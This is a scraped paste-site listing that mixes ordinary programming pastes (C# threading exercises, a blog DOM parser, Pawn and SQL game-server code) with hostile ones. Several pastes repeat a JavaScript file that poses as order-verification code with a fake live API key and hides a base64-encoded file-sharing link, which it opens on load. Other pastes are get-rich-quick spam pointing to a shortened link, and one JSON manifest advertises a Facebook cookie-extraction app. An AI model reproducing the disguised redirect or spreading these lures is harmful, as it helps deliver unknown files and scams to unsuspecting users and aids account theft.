        if (cells.length === 1 && cells[0].hasAttribute('colspan')) return; // Skip ""No posts"" row
        if (cells.length !== 9) {
            console.warn(`neo-parser-dom.js: Row ${rowIndex} in table skipped: Expected 9 cells, found ${cells.length}.`, row);
            return;
        }

        const post = {};
        try {
            post.postId = row.dataset.postId || cells[0]?.textContent.trim() || null;
            post.title = cells[1]?.textContent.trim() || '';
            post.url = cells[2]?.textContent.trim() || ''; // Plain text URL
            post.publishedIso = cells[3]?.querySelector('time')?.getAttribute('datetime') || cells[3]?.textContent.trim() || '';
            post.publishedFormatted = cells[4]?.textContent.trim() || '';
            post.author = cells[5]?.textContent.trim() || '';

            const labelListItems = cells[6]?.querySelectorAll('li');
            post.labels = labelListItems ? Array.from(labelListItems).map(li => ({
                name: li.getAttribute('neo-label-name') || li.textContent.trim(),
                url: li.getAttribute('data-label-url') || null
            })) : [];

            post.snippet = cells[7]?.textContent.trim() || '';
            const imageUrl = cells[8]?.textContent.trim();
            post.firstImageUrl = (imageUrl && imageUrl !== '(No image)') ? imageUrl : null;

            posts.push(post);
        } catch (cellError) {
            console.warn(`neo-parser-dom.js: Error parsing cells in table row ${rowIndex}:`, cellError, row);
        }
    });
    return posts;
}

/**
 * Parses data from an Item page (Single Post). DOM ONLY version.
 * @returns {Object|null} Post detail object or null.
 */
function parseItemPageDOM() {
    const article = document.querySelector('article.neo-post[itemscope]');
    if (!article) {
         console.warn(""neo-parser-dom.js: Article element for Item page not found."");
         return null;
    }

    const post = {};
    const contentDiv = article.querySelector('div[itemprop=""articleBody""]');

    post.postId = contentDiv?.id?.replace('neo-post-body-', '') || null;
    post.title = article.querySelector('h1[itemprop=""headline""]')?.textContent.trim() || document.title; // Fallback to doc title
    post.url = window.location.href; // Current URL

    const timeEl = article.querySelector('time[itemprop=""datePublished""]');
    post.publishedIso = timeEl?.getAttribute('datetime') || '';
    post.publishedFormatted = timeEl?.textContent.trim() || '';

    const labelLinks = article.querySelectorAll('.neo-post-labels a[itemprop=""keywords""]');
    post.labels = labelLinks ? Array.from(labelLinks).map(a => ({
        name: a.textContent.trim(),
        url: a.href || null
    })) : [];

    post.bodyHtml = contentDiv?.innerHTML || '';
    // post.author = article.querySelector('[itemprop=""author""]')?.textContent.trim() || ''; // Add if author itemprop exists

    return post;
}

/**
 * Parses data from a Static page. DOM ONLY version.
 * @returns {Object|null} Page detail object or null.
 */
function parseStaticPageDOM() {
    const pageDiv = document.querySelector('div.neo-custom-page');
    if (!pageDiv) {
        console.warn(""neo-parser-dom.js: Container element for Static page not found."");
        return null;
    }

    const page = {};
    const contentDiv = pageDiv.querySelector('div.neo-page-content');

    page.pageId = contentDiv?.id?.replace('neo-post-body-', '') || null;
    page.title = pageDiv.querySelector('h1.neo-page-title')?.textContent.trim() || document.title; // Fallback
    page.url = window.location.href;
    page.bodyHtml = contentDiv?.innerHTML || '';

    return page;
}

/**
 * Parses data from an Error page. DOM ONLY version.
 * @returns {Object} Page detail object.
 */
function parseErrorPageDOM() {
     const pageDiv = document.querySelector('div.neo-error-page');
     const title = pageDiv?.querySelector('h1')?.textContent.trim() || ""Error"";
     const message = pageDiv?.querySelector('p')?.textContent.trim() || ""Page not found."";
     return { title, message };
}

/**
 * Parses data from an Unknown page type. DOM ONLY version.
 * @returns {Object} Page detail object.
 */
function parseUnknownPageDOM() {
     const pageDiv = document.querySelector('div.neo-unknown-page');
     const title = pageDiv?.querySelector('h1')?.textContent.trim() || ""Unknown Page"";
     const message = pageDiv?.querySelector('p')?.textContent.trim() || ""Unknown page type detected."";
     return { title, message };
}


// --- Execution ---
document.addEventListener('DOMContentLoaded', () => {
    // console.log(""neo-parser-dom.js: DOM fully loaded. Starting DOM-only parser..."");
    // Parse the data using only DOM and store it globally
    window.parsedBloggerDataDOM = parseBloggerDataDOMOnly();

    // Example: Access the data
    // console.log(""Accessing DOM-parsed data:"", window.parsedBloggerDataDOM);
});"
Rdtuj7hb,AsyncTask,ivorakitin,C#,Wednesday 9th of April 2025 06:44:04 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Remoting.Messaging;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ConsoleApp25
{
    class Program
    {
        delegate string MyDelegate(int a, out int b);
        static void Main(string[] args)
        {
            WithPolling();
        }

        public static void MyCallback(IAsyncResult ar)
        {
            //int b = 0;
            //string str = ((AsyncResult)ar).AsyncDelegate.EndInvoke(out b, ar);
            //Console.WriteLine(str + "": the b returned is: "" + b);
        }

        public static void WithPolling()
        {
            MyDelegate dlg = new MyDelegate(MyMethod);
            int b = 0;
            IAsyncResult ar = dlg.BeginInvoke(2000, out b, null, null);
            Console.WriteLine(""Some additional work - {0}"", b);
            int count = 0;
            while(!ar.IsCompleted)
            {
                count++;
                Thread.Sleep(100);
                //Console.WriteLine(""Continue doing other work"");
                //continue doing other work
            }
            Console.WriteLine(""Counter: {0}"", count);

            //end work
            ar.AsyncWaitHandle.WaitOne(9000);
            String str = dlg.EndInvoke(out b, ar);
            Console.WriteLine(str + "": the b returned is: "" + b);
            Console.ReadKey();
        }

        public static void WithWaitable()
        {
            MyDelegate dlg = new MyDelegate(MyMethod);
            int b = 0;
            IAsyncResult ar = dlg.BeginInvoke(1000, out b, null, null);
            Console.WriteLine(""Some additional work - {0}"", b);
            //end work
            ar.AsyncWaitHandle.WaitOne(9000);
            Console.WriteLine(""End of waitone()"");
            String str = dlg.EndInvoke(out b, ar);
            Console.WriteLine(str + "": the b returned is: "" + b);
            Console.ReadKey();
        }

        public static void WithEndInvoke()
        {
            MyDelegate dlg = new MyDelegate(MyMethod);
            int b = 0;
            IAsyncResult ar = dlg.BeginInvoke(3000, out b, null, null);
            Console.WriteLine(""Some additional work - {0}"", b);
            //end work
            String str = dlg.EndInvoke(out b, ar);
            Console.WriteLine(str + "": the b returned is: "" + b);
            Console.ReadKey();
        }

        public static string MyMethod(int a, out int b)
        {
            Thread.Sleep(a);
            b = Thread.CurrentThread.GetHashCode();
            return ""Returned from my asynchronous method"";
        }
    }
}
"
r2cV9Hrp,2025-04-09T13:39:10.500400,powerampache,PHP,Wednesday 9th of April 2025 06:39:10 AM CDT,"1.01-79-play (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.NullSessionException: Session is NULL
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.authToken(BaseAmpacheRepository.kt:87)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$authToken$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:958)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loopOnce(Looper.java:230)
	at android.os.Looper.loop(Looper.java:319)
	at android.app.ActivityThread.main(ActivityThread.java:9063)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:588)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1103)

"
APzVEgXA,Products.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 06:36:11 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25106/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
f7Y7C73R,EARN $900 INSTANTLY 2025 2U,mohmedel,JavaScript,Wednesday 9th of April 2025 06:34:55 AM CDT," 
Pdf https://tinyurl.com/privguidee


UVVwjYB33E
"
XzKmMDD8,Untitled,Jubiar,JSON,Wednesday 9th of April 2025 06:29:46 AM CDT,"{
  ""latest_version"": ""1.4"",
  ""min_required_version"": ""1.0"",
  ""release_date"": ""2025-04-09"",
  ""release_notes"": ""- Fixed cookie extraction issues\n- Improved user interface\n- Added auto-save feature\n- Enhanced security measures\n- Performance optimizations"",
  ""download_url"": ""https://example.com/fbcookie-1.3.apk""
}"
i2NJNmhn,Barrier,ivorakitin,C#,Wednesday 9th of April 2025 06:28:14 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ConsoleApp24
{
    class Program
    {
        static void Main(string[] args)
        {
            /*
            Console.WriteLine(""Countdown example"");
            for (int i = 0; i < CountDownEventExample.numEvents i++)
            {
                //Console.WriteLine(""Press <Enter>"");
                //Console.ReadLine();
                Thread t = new Thread(CountDownEventExample.MyMethod);
                t.Name = ""Thread "" + i;
                t.Start();
            }
            CountDownEventExample.countDownEvent.Wait();
            Console.WriteLine(""Unblocked"");
            Console.ReadLine();*/
            /*
            Console.WriteLine(""Barrier example"");
            Thread t1 = new Thread(BarrierExample.MyMethod);
            t1.Name = ""1"";
            Thread t2 = new Thread(BarrierExample.MyMethod);
            t2.Name = ""2"";
            t1.Start();
            t2.Start();*/
            Thread[] threads = new Thread[5];
            for (int i = 0; i < threads.Length; i++)
            {
                threads[i] = new Thread(BarrierExample2.MyMethod);
                threads[i].Name = ""Thread "" + i;
            }
            for (int i = 0; i < threads.Length; i++)
            {
                threads[i].Start();
            }
            Console.ReadLine();
        }
    }

    class CountDownEventExample
    {
        public static int numEvents = 2;
        public static CountdownEvent countDownEvent = new CountdownEvent(numEvents);

        public static void MyMethod()
        {
            for (int i = 0; i < 5; i++)
            {
                Console.WriteLine(Thread.CurrentThread.Name + "" "" + i);
                Thread.Sleep(200);
            }
            countDownEvent.Signal();
        }
    }

    class BarrierExample
    {
        public static Barrier barrier = new Barrier(2); //2 threads
        
        public static void MyMethod()
        {
            for (int i = 0; i < 4; i++)
            {
                Console.WriteLine(""Thread {0} reached phase {1}"", 
                    Thread.CurrentThread.Name, barrier.CurrentPhaseNumber);
                barrier.SignalAndWait();
            }
        }
    }

    class BarrierExample2
    {
        public static Barrier barrier = new Barrier(5); //2 threads
        public static void MyMethod()
        {
            Random r = new Random();
     
            for (int i = 0; i < 5; i++)
            {
                Thread.Sleep(r.Next(1000));
                Console.WriteLine(""Thread {0} reached phase {1}"",
                    Thread.CurrentThread.Name, barrier.CurrentPhaseNumber);
                barrier.SignalAndWait();
            }
        }
    }
}
"
sExYqwkD,Make $1000 15-MINUTES (BEGINNER) FM,mohmedel,JavaScript,Wednesday 9th of April 2025 06:21:31 AM CDT," 
Pdf https://tinyurl.com/privguidee


rOs6qBby49
"
GDQTG4T7,Order.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 06:20:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76200/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3wqsSysc,Semaphores,ivorakitin,C#,Wednesday 9th of April 2025 06:20:22 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ConsoleApp23
{
    class Program
    {
        public static Semaphore semaphore = new Semaphore(3, 5);
        public static void Main(string[] args)
        {
            for (int i = 0; i < 10; i++)
            {
                Thread threadObject = new Thread(Process);
                threadObject.Name = ""Thread: "" + i;
                threadObject.Start();
            }
            Console.ReadLine();
        }
        private static void Process()
        {
            Console.WriteLine(""{0} is waiting to enter the critical section."", Thread.CurrentThread.Name);
            semaphore.WaitOne();
            Console.WriteLine(""{0} is inside the critical section now..."", Thread.CurrentThread.Name);
            Thread.Sleep(1000);
            Console.WriteLine(""{0} is releasing the critical section..."", Thread.CurrentThread.Name);
            semaphore.Release();
        }
    }
}
"
bHH3YUS6,Summer Outfit,MladenKarachanov,C#,Wednesday 9th of April 2025 06:06:47 AM CDT,"int degrees = int.Parse(Console.ReadLine());
string time = Console.ReadLine();

string Outfit = """";
string Shoes = """";
if (degrees >= 10 && degrees <= 18)
{
    if (time == ""Morning"")
    {
        Outfit = ""Sweatshirt"";
        Shoes = ""Sneakers"";
    }
    else if (time == ""Afternoon"")
    {
        Outfit = ""Shirt"";
        Shoes = ""Moccasins"";
    }

    else if (time == ""Evening"")
    {
        Outfit = ""Shirt"";
        Shoes = ""Moccasins"";
    }
}
else if (degrees > 18 && degrees <= 24)

    if (time == ""Morning"")
    {
        Outfit = ""Shirt"";
        Shoes = ""Moccasins"";
    }
    else if (time == ""Afternoon"")
    {
        Outfit = ""T-Shirt"";
        Shoes = ""Sandals"";
    }

    else if (time == ""Evening"")
    {
        Outfit = ""Shirt"";
        Shoes = ""Moccasins"";
    }

     else if (degrees >= 25)

      if (time == ""Morning"")
    {
        Outfit = ""T-Shirt"";
        Shoes = ""Sandals"";
    }
    else if (time == ""Afternoon"")
    {
        Outfit = ""Swim Suit"";
        Shoes = ""Barefoot"";
    }

    else if (time == ""Evening"")
    {
        Outfit = ""Shirt"";
        Shoes = ""Moccasins"";
    }


    Console.WriteLine($""It's {degrees} degrees, get your {Outfit} and {Shoes}."");

//Не е решена"
XNVXJe3C,Market.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 06:05:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06978/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wzzaZWE1,mutex,ivorakitin,C#,Wednesday 9th of April 2025 06:01:22 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ConsoleApp22
{
    class Program
    {
        [MethodImpl (MethodImplOptions.Synchronized)]
        public void DoSomething()
        {

        }
        static void Main(string[] args)
        {
            MyCounter c = new MyCounter();
            IncThread myt1 = new IncThread(c);
            DecThread myt2 = new DecThread(c);
            myt1.th.Join();
            myt2.th.Join();
            Console.Read();
        }
    }
    class MyCounter
    {
        private int count = 0;
        private Mutex MuTexLock;
        public MyCounter()
        {
            MuTexLock = new Mutex();
        }

        public Mutex getMutex()
        {
            return MuTexLock;
        }

        public int getCount()
        {
            return count;
        }

        public void setCount(int c)
        {
            count = c;
        }

    }
    class IncThread
    {
        public Thread th;
        private MyCounter c;
        public IncThread(MyCounter c)
        {
            this.c = c;
            th = new Thread(this.Go);
            th.Start();
        }
        void Go()
        {
            Console.WriteLine(""IncThread is waiting for the mutex."");
            c.getMutex().WaitOne();
            Console.WriteLine(""IncThread acquires the mutex."");
            int num = 10;
            do
            {
                Thread.Sleep(50);
                c.setCount(c.getCount()+1);
                Console.WriteLine(""In IncThread, MyCounter.count is "" + c.getCount());
                num--;
            } while (num > 0);
            Console.WriteLine(""IncThread releases the mutex."");
            c.getMutex().ReleaseMutex();
        }
    }
    class DecThread
    {
        public Thread th;
        private MyCounter c;
        public DecThread(MyCounter c)
        {
            this.c = c;
            th = new Thread(this.Go);
            th.Start();
        } 
       void Go()
       {  
            Console.WriteLine(""DecThread is waiting for the mutex."");
            c.getMutex().WaitOne();  
            Console.WriteLine(""DecThread acquires the mutex."");  
            int num = 10;  
            do  
            {  
                Thread.Sleep(50);
                c.setCount(c.getCount() - 1);
                Console.WriteLine(""In DecThread, MyCounter.count is "" + c.getCount());  
                num--;  
            } while (num > 0);  
            Console.WriteLine(""DecThread releases the mutex."");
            c.getMutex().ReleaseMutex();  
       }  
    }  
}
"
LD9mDGTL,dataNone,TestGuy1,JSON,Wednesday 9th of April 2025 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '27339e6b2b15fab5f85b3f52b588076abfd923fe4f7efe036f4f050e222591a4989c3deed64b54044eda6a82c41a808a7b8639bace1939ba4978e3581556f53650067cd9bb27d91d7f4f2be6fd4ffa44a7ee9b50b6775436be6ffae90532e9889e20b44e133132f2b73029c09d62d63df7862d7ff83d1ed39dd4141e0bed535f',
  otherdata: [
    '16ed5e4c77ad53882a4daa4ea2ec4b4e',
    '0032bfdd25560fb6dc7e56412047c53e',
    '77d9e46bf92b53efe72a982d3000b53b',
    'e5d78b44642304e583b6bb228bc75fdd',
    'b6516e330808fa208df2c7d9e14068c5',
    '98814046bab162fdbf64d758ecc6359a',
    'ecb37318e72d2878e3c5a66af2c5a8cf',
    'caf61e3d755ceb23a2af99f9d47ad418'
  ]
}"
xzhEd1pK,Untitled,SpawnKz,JavaScript,Wednesday 9th of April 2025 05:49:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92322/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mDKs7wVB,Products.js,Ratqueenkslskskwkw,JavaScript,Wednesday 9th of April 2025 05:34:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71992/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
82TCiHkK,Untitled,execution88,Pawn,Wednesday 9th of April 2025 05:29:53 AM CDT,"static enum E_FAMILY_MEMBERS_QUERY_INFO
{
	Cache: E_FAMILY_MEMBERS_QUERY_CACHE,
	E_FAMILY_MEMBERS_QUERY_UNIX
}

static g_family_members_query_info[MAX_FAMILY][E_FAMILY_MEMBERS_QUERY_INFO];
static g_reset_fam_members_query_info[E_FAMILY_MEMBERS_QUERY_INFO] = 
{
	Cache: 0,
	0
};

stock ShowFamilyMembersAll(playerid)
{
	new family_id = FamilyPlayer:GetId(playerid);

	if (family_id == INVALID_FAMILY_ID) {
		return false;
	}

	new row_count;

	if (g_family_members_query_info[family_id][E_FAMILY_MEMBERS_QUERY_CACHE] == g_reset_fam_members_query_info[E_FAMILY_MEMBERS_QUERY_CACHE] ||
		g_family_members_query_info[family_id][E_FAMILY_MEMBERS_QUERY_UNIX] < unix)
	{
		if (cache_is_valid(g_family_members_query_info[family_id][E_FAMILY_MEMBERS_QUERY_CACHE]))
		{
			cache_delete(g_family_members_query_info[family_id][E_FAMILY_MEMBERS_QUERY_CACHE]);
		}

		LoadFamilyMembersAll(playerid);
	}
	else
	{
		g_string_4096 = ""["";

		cache_unset_active();
		cache_set_active(g_family_members_query_info[family_id][E_FAMILY_MEMBERS_QUERY_CACHE]);

		row_count = cache_num_rows();

		new 
			name[MAX_PLAYER_NAME_RUS],
			rank_id,
			warn,
			completed_count,
			status,
			family_rank_name[MAX_FAMILY_RANK_NAME];

		for (new i = 0; i < row_count; i++) 
		{
			
			cache_get_value_int(i, ""rank_id"", rank_id);
			cache_get_value_int(i, ""warn"", warn);
			cache_get_value_int(i, ""status"", status);
			cache_get_value_int(i, ""completed_count"", completed_count);
			cache_get_value(i, ""name"", name, sizeof(name));

			FamilyRank:GetName(family_id, rank_id, family_rank_name);

			format(g_string_256, sizeof(g_string_256), ""\
				{\
					\""id\"":%d,\
					\""status\"":\""%d\"",\
					\""nickName\"":\""%s\"",\
					\""post\"":\""%s\"",\
					\""rank\"":%d, \
					\""totalQuests\"":%d, \
					\""reprimand\"":%d \
				},"",
				i,
				status != 1001,
				name,
				family_rank_name,
				completed_count,
				warn
			);

			strcat(g_string_4096, g_string_256);

			if (strlen(g_string_4096) > 3900)
			{
				g_string_4096[strlen(g_string_4096) - 1] = EOS;
				strcat(g_string_4096, ""]"");

				// SendFamilyMembers(playerid, g_string_4096);
				g_string_4096 = ""["";
			}
		}

		g_string_4096[strlen(g_string_4096) - 1] = EOS;
		strcat(g_string_4096, ""]"");

		// SendFamilyMembers(playerid, g_string_4096);
	}
	
	return true;
}

stock LoadFamilyMembersAll(playerid)
{
	new family_id = FamilyPlayer:GetId(playerid);

	if (family_id == INVALID_FAMILY_ID) 
	{
		return false;
	}

	format(g_string_512, sizeof g_string_512, ""\
		SELECT \
			a.NickName AS name, \
			fp.account_id, \
			fp.rank_id, \
			fp.warn, \
			a.Online_status as status, \
			(SELECT COUNT(*) AS completed_count \
				FROM contracts \
				WHERE account_id = fp.account_id AND type = %d AND completed = 1) as contact_count) \
		FROM \
			""#FAMILY_PLAYER_TABLE_NAME"" fp \
		INNER JOIN \
			Qelksekm AS a \
		ON \
			a.ID=fp.account_id \
		WHERE \
			fp.family_id=%d \
		ORDER BY \
			fp.rank_id DESC"",
		CONTRACT_TYPE_FAMILY, 
		Family:GetSQLId(family_id));
	mysql_tquery(connection[HANDLE_SERVER], g_string_512, ""OnLoadFamilyMembersAll"", ""ddd"", playerid, ConnectPersonalID[playerid], family_id);

	return true;
}

void OnLoadFamilyMembersAll(playerid, connect_id, family_id)
{
	if (connect_id != ConnectPersonalID[playerid]) 
	{
		return true;
	}

	new rows = cache_num_rows();

	if (rows == 0) 
	{
		return SendErrorNotify(playerid, ""Информация о составе семьи не найдена"");
	}

	g_family_members_query_info[family_id][E_FAMILY_MEMBERS_QUERY_CACHE] = cache_save();
	g_family_members_query_info[family_id][E_FAMILY_MEMBERS_QUERY_UNIX] = unix + FAMILY_MEMBERS_QUERY_DELAY;

	ShowFamilyMembersAll(playerid);

	return true;
}"
EYFaXNT5,Order.js,Ratqueenkslskskwkw,JavaScript,Wednesday 9th of April 2025 05:18:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91554/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gNSqMmB4,Вещи 8.1.5(миф) + пвп гир + ключи с 8.1,Sansuall,MySQL,Wednesday 9th of April 2025 05:14:00 AM CDT,"REPLACE INTO TItemPrice VALUES
-- Ключи (415 илвл) - КОНТЕКСТ 35 - 1799
(159623, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(159622, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(159630, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(155881, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(158320, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(158319, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(159610, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(158712, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(159631, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(159625, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(159624, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(159611, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(159626, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(159612, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(159619, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(158367, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(159618, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(159617, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(159620, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(159615, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(159614, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(158368, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(159627, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(158374, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(159644, 2, 1799, 'Y', 000, '5010,1587,4786', 0, 35),
(165573, 2, 1799, 'Y', 000, '4799,1522,4786', 0, 35),
-- Пивпи гир (410), азеритки (415) - КОНТЕКСТ 56 - 1799
(164779, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(164780, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164781, 2, 1799, 'Y', 000, '5193,4802,5142,1522,4786', 0, 56),
(164782, 2, 1799, 'Y', 000, '5194,5141,1527,5420,4786', 0, 56),
(164783, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164784, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(164785, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164786, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164812, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
